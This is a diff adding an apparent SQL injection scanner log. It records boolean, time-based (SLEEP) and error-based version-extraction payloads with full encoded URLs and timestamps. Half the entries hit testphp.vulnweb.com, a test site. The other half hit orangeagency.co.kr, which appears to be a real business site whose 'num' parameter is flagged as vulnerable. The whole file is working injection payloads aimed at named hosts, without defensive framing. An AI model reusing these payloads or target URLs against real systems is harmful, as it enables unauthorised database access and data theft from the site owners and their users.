@@ -1,0 +1,60 @@
+Vulnerable parameter: artist
+Payload used: 1' OR '1'='1
+Test URL: http://testphp.vulnweb.com/artists.php?artist=1%27+OR+%271%27%3D%271
+Time: Sun Oct  5 14:32:08 2025
+----------------------------------------
+Vulnerable parameter: artist
+Payload used: 1' OR '1'='1' -- 
+Test URL: http://testphp.vulnweb.com/artists.php?artist=1%27+OR+%271%27%3D%271%27+--+
+Time: Sun Oct  5 14:32:12 2025
+----------------------------------------
+Vulnerable parameter: artist
+Payload used: ' OR '1'='1
+Test URL: http://testphp.vulnweb.com/artists.php?artist=%27+OR+%271%27%3D%271
+Time: Sun Oct  5 14:32:15 2025
+----------------------------------------
+Vulnerable parameter: artist
+Payload used: ' OR '1'='1' -- 
+Test URL: http://testphp.vulnweb.com/artists.php?artist=%27+OR+%271%27%3D%271%27+--+
+Time: Sun Oct  5 14:32:17 2025
+----------------------------------------
+Vulnerable parameter: artist
+Payload used: 1' AND SLEEP(5) -- 
+Test URL: http://testphp.vulnweb.com/artists.php?artist=1%27+AND+SLEEP%285%29+--+
+Time: Sun Oct  5 14:32:19 2025
+----------------------------------------
+Vulnerable parameter: artist
+Payload used: 1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT version()), FLOOR(RAND(0)*2))x FROM information_schema.columns GROUP BY x)a) -- 
+Test URL: http://testphp.vulnweb.com/artists.php?artist=1%27+AND+%28SELECT+1+FROM+%28SELECT+COUNT%28%2A%29%2C+CONCAT%28%28SELECT+version%28%29%29%2C+FLOOR%28RAND%280%29%2A2%29%29x+FROM+information_schema.columns+GROUP+BY+x%29a%29+--+
+Time: Sun Oct  5 14:32:22 2025
+----------------------------------------
+Vulnerable parameter: num
+Payload used: 1' OR '1'='1
+Test URL: http://www.orangeagency.co.kr/input/view.php?num=1%27+OR+%271%27%3D%271
+Time: Sun Oct  5 14:35:14 2025
+----------------------------------------
+Vulnerable parameter: num
+Payload used: 1' OR '1'='1' -- 
+Test URL: http://www.orangeagency.co.kr/input/view.php?num=1%27+OR+%271%27%3D%271%27+--+
+Time: Sun Oct  5 14:35:17 2025
+----------------------------------------
+Vulnerable parameter: num
+Payload used: ' OR '1'='1
+Test URL: http://www.orangeagency.co.kr/input/view.php?num=%27+OR+%271%27%3D%271
+Time: Sun Oct  5 14:35:20 2025
+----------------------------------------
+Vulnerable parameter: num
+Payload used: ' OR '1'='1' -- 
+Test URL: http://www.orangeagency.co.kr/input/view.php?num=%27+OR+%271%27%3D%271%27+--+
+Time: Sun Oct  5 14:35:22 2025
+----------------------------------------
+Vulnerable parameter: num
+Payload used: 1' AND SLEEP(5) -- 
+Test URL: http://www.orangeagency.co.kr/input/view.php?num=1%27+AND+SLEEP%285%29+--+
+Time: Sun Oct  5 14:35:24 2025
+----------------------------------------
+Vulnerable parameter: num
+Payload used: 1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT version()), FLOOR(RAND(0)*2))x FROM information_schema.columns GROUP BY x)a) -- 
+Test URL: http://www.orangeagency.co.kr/input/view.php?num=1%27+AND+%28SELECT+1+FROM+%28SELECT+COUNT%28%2A%29%2C+CONCAT%28%28SELECT+version%28%29%29%2C+FLOOR%28RAND%280%29%2A2%29%29x+FROM+information_schema.columns+GROUP+BY+x%29a%29+--+
+Time: Sun Oct  5 14:35:27 2025
+----------------------------------------
